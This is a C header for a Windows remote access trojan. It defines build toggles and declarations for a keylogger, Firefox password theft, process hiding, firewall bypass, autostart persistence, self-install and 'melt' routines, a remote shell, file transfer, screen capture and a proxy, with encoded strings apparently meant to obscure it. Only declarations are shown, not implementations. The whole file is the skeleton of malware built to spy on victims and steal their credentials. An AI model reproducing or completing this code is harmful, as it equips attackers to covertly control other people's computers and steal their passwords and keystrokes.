//#define _WIN32_WINNT 0x0500
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker, "/RELEASE")			// Release code
#pragma comment(linker, "/opt:nowin98")
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.

#define PROTOCOLVERSION		"034"		

//#define DEBUG
//#define NO_INSTALL
//#define NO_AUTOSTART
//#define NO_PROCHIDDER
//#define NO_FIREWALLBYPASS

//#define NO_INFO
//#define NO_FILES
//#define NO_SHELL
//#define NO_PROCESS
//#define NO_MSGBOX
//#define NO_REBOOT
//#define NO_KEYLOGGER
//#define NO_PROXY
//#define NO_FIREFOX
//#define NO_CAPTURE


#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <tchar.h>
#include <crtdbg.h>
#include <netfw.h>
#include <objbase.h>
#include <oleauto.h>


#include "enumstr.h"
#include "dlls.h"


#define MAX_RECEIVE_BUFFER			4096
#define THREAD_WAIT_TIME			30
#define MAX_THREADS					256
#define DEFAULT_TRANSMIT_TIMEOUT	10

typedef enum
{
	ECHO,
	LOGIN,
	INFO,
	FILES,
	FILEINOUT,
	FILEACTION,
	SHELL,
	PROCESS,
	PROCESSACTION,
	KEYLOGGERACTION,
	PROXYACTION,
	CAPTUREACTION,
	CAPTURESEND
} sendmsgtype_s;

typedef enum
{
	NONE,
	T_SHELL,
	T_TRANSFER,
	T_PROCHIDE,
	T_KEYLOGGER,
	T_PROXY,
	T_PROXYCLIENT
} thread_type;

typedef struct
{
	HANDLE		tHandle;
	thread_type type;
} thread_s;

typedef struct
{
	int		tnum;
	SOCKET	sock;
} shell_s;

typedef struct
{
	int		tnum;
	int		sleeptime;
} sys_proch_s;

typedef struct
{
	int		tnum;
	SOCKET	sock;
//	BOOL	realtimereport;
	char	filedest[MAX_PATH];
} keylogger_s;

typedef struct
{
	int		tnum;
	int		port;
	char	data[512];
	SOCKET	sock;
} proxy_s;

typedef struct
{
	stringtype	stype;
	char		*encoded;
	char		isdecoded;
} strings_s;

int NET_Connect(char *host, unsigned short port);
int NET_Send(SOCKET sock, sendmsgtype_s msgtype, char *buffer);


HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);

unsigned int Decode(stringtype stype);
void DecodeSemiString(char *str);
void ClearDecoded();

void LDLLs();

BOOL StartClone(char *me, char *target, char *path);

#ifndef NO_MSGBOX
int InjectMessageBox(char *errormessage);
#endif

#ifndef NO_SHELL
DWORD WINAPI SHELL_Thread(LPVOID param);
void SHELL_WriteIn(char *bufferin);
void SHELL_Stop();
#endif

#ifndef NO_INFO
void INFO_SendInfoData(SOCKET sock);
#endif

#ifndef NO_FILES
void FILES_Main(SOCKET sock, char *indir);
void FILES_Delete(SOCKET sock, char *file);
void FILES_MakeDir(SOCKET sock, char *dir);
void FILES_DeleteDir(SOCKET sock, char *dir);
void FILES_SendAndGet(SOCKET sock, char *file, char *host, int port, BOOL send, BOOL del);
#endif

#ifndef NO_PROCESS
void PROC_List(SOCKET sock);
void PROC_Kill(SOCKET sock, DWORD pid, unsigned int exitcode);
void PROC_Run(SOCKET sock, char *command);
#endif

#ifndef NO_REBOOT
void Reboot(BOOL shutdown);
#endif

#ifndef NO_KEYLOGGER
void KL_DecodeKeys();
DWORD WINAPI KL_Thread(LPVOID param);
#endif

#ifndef NO_PROXY
DWORD WINAPI PROXY_Thread(LPVOID param);
DWORD WINAPI PROXY_Client(LPVOID param);
#endif

#ifndef NO_FIREFOX
int FIREFOX_FindPasses(SOCKET sock);
#endif

#ifndef NO_INSTALL
void InstallMe(char *filename);
void UninstallMe(char *filename);
void Melt(char **cmdline, int params, char *errormessage);
#endif

#ifndef NO_PROCHIDDER
DWORD WINAPI SYS_ProcHidder(LPVOID param);
#endif

#ifndef NO_AUTOSTART
void EnableAutoStart(char *key, char *cmdline);
void DisableAutoStart(char *key);
#endif

#ifndef NO_FIREWALLBYPASS
int WinFWBypass(char *desc);
#endif

#ifndef NO_CAPTURE
int CAP_Screen(SOCKET sock, char *command, char *host);
#endif

